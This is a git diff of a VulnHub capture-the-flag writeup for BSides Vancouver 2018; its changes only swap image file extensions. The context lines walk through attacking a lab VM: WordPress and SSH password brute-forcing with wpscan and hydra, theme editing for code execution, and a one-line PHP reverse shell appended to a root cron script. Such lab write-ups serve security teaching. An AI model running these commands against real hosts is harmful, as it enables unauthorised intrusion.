@@ -7,7 +7,7 @@ tags: vulnhub, writeup
 ## Overview
 This is a writeup for VulnHub VM [BSides Vancouver: 2018 (Workshop)](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_vulnhub_bsidesvancouver2018workshop/killchain.png)
+![writeup.overview.killchain](/static/files/posts_vulnhub_bsidesvancouver2018workshop/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -63,14 +63,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 ftp://192.168.92.169/public/users.txt.bk
 ```
 
-![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot03.png)  
+![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot03.png.webp)  
 
 3\. We find one disallowed entry within `robots.txt`:  
 ```
 http://192.168.92.169/robots.txt → /backup_wordpress
 ```
 
-![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot01.png)  
+![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot01.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -96,45 +96,45 @@ wordpress: admin, john
 wpscan --url http://192.168.92.167:69/ -e vp,vt,tt,cb,dbe,u,m --no-color → admin, john
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot02.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot02.png.webp)  
 
 2\. (method #1) We run a Wordpress password bruteforce attempt for user `john`:  
 ```
 wpscan --url http://192.168.92.169/backup_wordpress/ --wordlist /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt --username john
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot04.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot04.png.webp)  
 
 3\. (method #1) While testing, an unknown response is sent for username, password combo of `john` and `enigma`:  
 
-![writeup.exploitation.steps.3.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot05.png)  
+![writeup.exploitation.steps.3.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot05.png.webp)  
 
 4\. (method #1) We test these credentials manually and are successfully logged in:  
 
-![writeup.exploitation.steps.4.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot06.png)  
+![writeup.exploitation.steps.4.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot06.png.webp)  
 
 5\. (method #1) We edit the `footer.php` theme file to gain command execution:  
 
-![writeup.exploitation.steps.5.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot07.png)  
+![writeup.exploitation.steps.5.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot07.png.webp)  
 
 6\. (method #1) After successfully testing command execution, we upload a PHP reverse shell by editing the `Hello Dolly` plugin and gain interactive access:  
 
-![writeup.exploitation.steps.6.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot08.png)  
+![writeup.exploitation.steps.6.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot08.png.webp)  
 
 7\. (method #2) We manually test SSH login for all users mentioned within the `users.txt.bk` file and find that password authentication is enabled only for user `anne`:  
 
-![writeup.exploitation.steps.7.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot10.png)  
+![writeup.exploitation.steps.7.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot10.png.webp)  
 
 8\. (method #2) We bruteforce SSH credentials for user `anne`:  
 ```
 hydra -l anne -P "/usr/share/wordlists/rockyou.txt" -e nsr -s 22 -o "./results/192.168.92.169/scans/tcp_22_ssh_hydra.txt" ssh://192.168.92.169 → anne/princess
 ```
 
-![writeup.exploitation.steps.8.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot12.png)  
+![writeup.exploitation.steps.8.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot12.png.webp)  
 
 9\. (method #2) We can ssh as user `anne` and gain interactive access:  
 
-![writeup.exploitation.steps.9.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot13.png)  
+![writeup.exploitation.steps.9.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot13.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -163,7 +163,7 @@ doomguy
 ## Phase #3: Privilege Escalation
 1\. (method #1) Continuing as user `www-data`, we explore the `/var/www/backup_wordpress/` directory and find `wp-config.php` file with MySQL credentials in it:  
 
-![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot15.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot15.png.webp)  
 
 2\. (method #1) These credentials do not work for MySQL login. Changing user to `john` with these credentials also failed.  
 
@@ -172,20 +172,20 @@ doomguy
 echo -e "php -r '\$sock=fsockopen(\"192.168.92.163\",8080);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" >>/usr/local/bin/cleanup
 ```
 
-![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot16.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot16.png.webp)  
 
 4\. (method #1) Within a minute, the updated `cleanup` file is executed as part of cronjob with `root` permissions and we catch an elevated shell using our netcat listener  
 
 5\. (method #1) We use this shell to view the contents of `/root/flag.txt` file:  
 
-![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot17.png)  
+![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot17.png.webp)  
 
 6\. (method #2) Continuing as user `anne`, we find that this user is part of `sudo` group and using `sudo -l` we see that `anne` can execute all commands as `root`. We use this fact to gain elevated privileges:  
 ```
 sudo su
 ```
 
-![writeup.privesc.steps.6.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot14.png)  
+![writeup.privesc.steps.6.1](/static/files/posts_vulnhub_bsidesvancouver2018workshop/screenshot14.png.webp)  
 
 ## Loot
 ### Hashes
